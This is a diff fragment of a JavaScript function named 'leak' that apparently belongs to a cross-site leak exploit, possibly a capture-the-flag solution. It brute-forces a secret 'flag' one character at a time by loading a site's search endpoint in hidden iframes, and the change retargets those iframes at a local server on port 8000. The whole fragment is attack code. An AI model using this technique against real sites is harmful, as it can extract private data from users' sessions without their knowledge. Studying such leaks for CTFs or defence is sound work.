@@ -10,7 +10,7 @@ async function leak() {
             const query = flag + char;
             const iframe = document.createElement("iframe");            
 
-            iframe.src = `/search?query=${query}`;
+            iframe.src = `http://127.0.0.1:8000/search?query=${query}`;
             iframe.style.display = "none";
 
             await new Promise((resolve) => {
